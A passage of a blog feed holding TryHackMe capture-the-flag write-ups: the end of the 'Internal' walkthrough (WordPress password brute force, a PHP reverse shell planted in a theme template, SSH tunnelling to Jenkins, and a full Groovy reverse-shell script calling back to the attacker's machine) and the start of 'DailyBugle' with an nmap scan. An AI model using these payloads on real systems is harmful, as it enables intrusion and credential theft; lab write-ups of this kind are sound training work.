&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Brute Forcing Author IDs - Time: 00:00:00 &amp;lt;&lt;span class="o">==================================================================================================================================================================================================&lt;/span>&amp;gt; &lt;span class="o">(&lt;/span>&lt;span class="m">10&lt;/span> / 10&lt;span class="o">)&lt;/span> 100.00% Time: 00:00:00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>i&lt;span class="o">]&lt;/span> User&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> Identified:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> admin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> Found By: Author Id Brute Forcing - Author Pattern &lt;span class="o">(&lt;/span>Aggressive Detection&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> Confirmed By: Login Error Messages &lt;span class="o">(&lt;/span>Aggressive Detection&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Performing password attack on Xmlrpc against &lt;span class="m">1&lt;/span> user/s
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>SUCCESS&lt;span class="o">]&lt;/span> - admin / my2boys
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Trying admin / princess7 Time: 00:04:06 &amp;lt; &amp;gt; &lt;span class="o">(&lt;/span>&lt;span class="m">3885&lt;/span> / 14348276&lt;span class="o">)&lt;/span> 0.02% ETA: ??:??:??
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> Valid Combinations Found:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> Username: admin, Password: my2boys
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> No WPScan API Token given, as a result vulnerability data has not been output.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> You can get a free API token with &lt;span class="m">25&lt;/span> daily requests by registering at https://wpscan.com/register
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Finished: Sun Dec &lt;span class="m">31&lt;/span> 15:33:36 &lt;span class="m">2023&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Requests Done: &lt;span class="m">3900&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Cached Requests: &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Data Sent: 2.001 MB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Data Received: 2.3 MB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Memory used: 190.441 MB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Elapsed time: 00:04:09
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Seems like it worked.&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Internal-writeup-THM/main/383e5267-e2e0-4d84-a69b-749bf9862c2d_Export-decaaa4d-2c6b-4d4a-b2e6-36c0415c2dd0/Internal%206e6f52af5eac4b2abbad67bc61a655b2/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>Here in the posts tab I can see that there is another post, but they haven’t published it, let’s see what there is into it:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Internal-writeup-THM/main/383e5267-e2e0-4d84-a69b-749bf9862c2d_Export-decaaa4d-2c6b-4d4a-b2e6-36c0415c2dd0/Internal%206e6f52af5eac4b2abbad67bc61a655b2/Untitled%201.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>Wow, now I have another se of credential:&lt;/p>
&lt;p>william:arnold147&lt;/p>
&lt;p>I am going to try to enter this in the ssh and phpmyadmin page.&lt;/p>
&lt;p>They didn’t work.&lt;/p>
&lt;p>Ok, now I am just going to get a reverse shell, from this point is pretty easy.&lt;/p>
&lt;p>You just want to go to the Theme Editor, and access the 404 Template, from there you can remove the php code, and plant your php reverse shell:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Internal-writeup-THM/main/383e5267-e2e0-4d84-a69b-749bf9862c2d_Export-decaaa4d-2c6b-4d4a-b2e6-36c0415c2dd0/Internal%206e6f52af5eac4b2abbad67bc61a655b2/Untitled%203.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>From there I started my listener and got the reverse shell:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Internal-writeup-THM/main/383e5267-e2e0-4d84-a69b-749bf9862c2d_Export-decaaa4d-2c6b-4d4a-b2e6-36c0415c2dd0/Internal%206e6f52af5eac4b2abbad67bc61a655b2/Untitled%204.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>Now that I am in I went to the opt folder and discovered these credentials:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">meterpreter &amp;gt; cat wp-save.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Bill,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Aubreanna needed these credentials &lt;span class="k">for&lt;/span> something later. Let her know you have them and where they are.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">aubreanna:bubb13guM!@#123
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So I entered from ssh:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh aubreanna@10.10.186.60
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">aubreanna@10.10.186.60&lt;span class="err">&amp;#39;&lt;/span>s password:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Welcome to Ubuntu 18.04.4 LTS &lt;span class="o">(&lt;/span>GNU/Linux 4.15.0-112-generic x86_64&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Documentation: https://help.ubuntu.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Management: https://landscape.canonical.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Support: https://ubuntu.com/advantage
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> System information as of Sun Dec &lt;span class="m">31&lt;/span> 21:32:39 UTC &lt;span class="m">2023&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> System load: 0.0 Processes: &lt;span class="m">114&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Usage of /: 63.8% of 8.79GB Users logged in: &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Memory usage: 44% IP address &lt;span class="k">for&lt;/span> eth0: 10.10.186.60
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Swap usage: 0% IP address &lt;span class="k">for&lt;/span> docker0: 172.17.0.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">=&lt;/span>&amp;gt; There is &lt;span class="m">1&lt;/span> zombie process.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Canonical Livepatch is available &lt;span class="k">for&lt;/span> installation.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - Reduce system reboots and improve kernel security. Activate at:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> https://ubuntu.com/livepatch
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> packages can be updated.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> updates are security updates.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Last login: Mon Aug &lt;span class="m">3&lt;/span> 19:56:19 &lt;span class="m">2020&lt;/span> from 10.6.2.56
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">aubreanna@internal:~$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Here we can retrieve the user.txt flag, and we can also see that there is a jenkins server running in &lt;code>172.17.0.2:8080&lt;/code>&lt;/p>
&lt;p>So I made a ssh tunnel using:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.186.60
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And from there we have a tunnel.&lt;/p>
&lt;p>Now we can simply go to localhost:8080 and we are in the login page for jenkins.&lt;/p>
&lt;p>From there I try to brute force the login page using ZAP.&lt;/p>
&lt;p>&lt;img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/7fecbb84-9598-4ec2-9fa9-5ad99163bcf9/b9960a90-b48b-4c25-ac64-83f5d0a17ac0/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>As you can see I got a request much different from the others, often that means that we have what we want.&lt;/p>
&lt;p>Now that we are into Jenkins we just need to go to the script console, and writing this:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Thread.start &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">String &lt;span class="nv">host&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;your_machine_IP&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">int &lt;span class="nv">port&lt;/span>&lt;span class="o">=&lt;/span>&amp;lt;your_webserver_port&amp;gt;&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">String &lt;span class="nv">cmd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;cmd.exe&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Process &lt;span class="nv">p&lt;/span>&lt;span class="o">=&lt;/span>new ProcessBuilder&lt;span class="o">(&lt;/span>cmd&lt;span class="o">)&lt;/span>.redirectErrorStream&lt;span class="o">(&lt;/span>&lt;span class="nb">true&lt;/span>&lt;span class="o">)&lt;/span>.start&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>Socket &lt;span class="nv">s&lt;/span>&lt;span class="o">=&lt;/span>new Socket&lt;span class="o">(&lt;/span>host,port&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>InputStream &lt;span class="nv">pi&lt;/span>&lt;span class="o">=&lt;/span>p.getInputStream&lt;span class="o">()&lt;/span>,pe&lt;span class="o">=&lt;/span>p.getErrorStream&lt;span class="o">()&lt;/span>, &lt;span class="nv">si&lt;/span>&lt;span class="o">=&lt;/span>s.getInputStream&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>OutputStream &lt;span class="nv">po&lt;/span>&lt;span class="o">=&lt;/span>p.getOutputStream&lt;span class="o">()&lt;/span>,so&lt;span class="o">=&lt;/span>s.getOutputStream&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">while&lt;/span>&lt;span class="o">(&lt;/span>!s.isClosed&lt;span class="o">()){&lt;/span>&lt;span class="k">while&lt;/span>&lt;span class="o">(&lt;/span>pi.available&lt;span class="o">()&lt;/span>&amp;gt;0&lt;span class="o">)&lt;/span>so.write&lt;span class="o">(&lt;/span>pi.read&lt;span class="o">())&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">while&lt;/span>&lt;span class="o">(&lt;/span>pe.available&lt;span class="o">()&lt;/span>&amp;gt;0&lt;span class="o">)&lt;/span>so.write&lt;span class="o">(&lt;/span>pe.read&lt;span class="o">())&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">while&lt;/span>&lt;span class="o">(&lt;/span>si.available&lt;span class="o">()&lt;/span>&amp;gt;0&lt;span class="o">)&lt;/span>po.write&lt;span class="o">(&lt;/span>si.read&lt;span class="o">())&lt;/span>&lt;span class="p">;&lt;/span>so.flush&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>po.flush&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>Thread.sleep&lt;span class="o">(&lt;/span>50&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>try &lt;span class="o">{&lt;/span>p.exitValue&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>break&lt;span class="p">;&lt;/span>&lt;span class="o">}&lt;/span>catch &lt;span class="o">(&lt;/span>Exception e&lt;span class="o">){}}&lt;/span>&lt;span class="p">;&lt;/span>p.destroy&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>s.close&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>cmd.exe if is windows, /bin/bash if is linux.&lt;/p>
&lt;p>And start the listener in our machine.&lt;/p>
&lt;p>Now that we are inside the machine we can go into the opt folder again and take the root credentials:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat note.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Aubreanna,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here. Use them &lt;span class="k">if&lt;/span> you
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">need access to the root user account.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root:tr0ub13guM!@#123
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>DailyBugle Writeup THM</title><link>https://simonefelici.github.io/p/dailybugle-writeup-thm/</link><pubDate>Mon, 01 Jan 2024 10:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/dailybugle-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/Blueaulo/DailyBugle-writeup-THM/main/99236161-baab-4e1e-8659-b58dbee818de_Export-bd191e58-92d7-4a75-b58b-142788c8928f/Daily%20Bugle%20f7664d233b7c4054a261e00462332c48/Untitled.png" alt="Featured image of post DailyBugle Writeup THM" />&lt;p>The first thing that we are going to do is a nmap scan:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -A 10.10.62.253
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2023-12-30 10:48 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.62.253
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.063s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">997&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>reset&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 7.4 &lt;span class="o">(&lt;/span>protocol 2.0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-hostkey:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">2048&lt;/span> 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &lt;span class="m">256&lt;/span> d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.6 &lt;span class="o">((&lt;/span>CentOS&lt;span class="o">)&lt;/span> PHP/5.6.40&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-generator: Joomla! - Open Source Content Management
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> http-robots.txt: &lt;span class="m">15&lt;/span> disallowed entries
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> /joomla/administrator/ /administrator/ /bin/ /cache/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> /cli/ /components/ /includes/ /installation/ /language/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache/2.4.6 &lt;span class="o">(&lt;/span>CentOS&lt;span class="o">)&lt;/span> PHP/5.6.40
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3306/tcp open mysql MariaDB &lt;span class="o">(&lt;/span>unauthorized&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">No exact OS matches &lt;span class="k">for&lt;/span> host &lt;span class="o">(&lt;/span>If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This is our output, we see that there are 3 ports open,&lt;/p>
&lt;ul>
&lt;li>ssh(useless for now)&lt;/li>
&lt;li>http&lt;/li>
&lt;li>3306, which is used by MariaDB&lt;/li>
&lt;/ul>
&lt;p>The first thing that I am going to do is exploring the web page&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/DailyBugle-writeup-THM/main/99236161-baab-4e1e-8659-b58dbee818de_Export-bd191e58-92d7-4a75-b58b-142788c8928f/Daily%20Bugle%20f7664d233b7c4054a261e00462332c48/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>After trying some thing, I cam accross the robots.txt directory:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># If the Joomla site is installed within a folder&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># eg www.example.com/joomla/ then the robots.txt file&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># MUST be moved to the site root&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># eg www.example.com/robots.txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># AND the joomla folder name MUST be prefixed to all of the&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># paths.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># eg the Disallow rule for the /administrator/ folder MUST&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># be changed to read&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Disallow: /joomla/administrator/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># For more information about the robots.txt standard, see:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># http://www.robotstxt.org/orig.html&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># For syntax checking, see:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># http://tool.motoricerca.info/robots-checker.phtml&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User-agent: *
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /administrator/
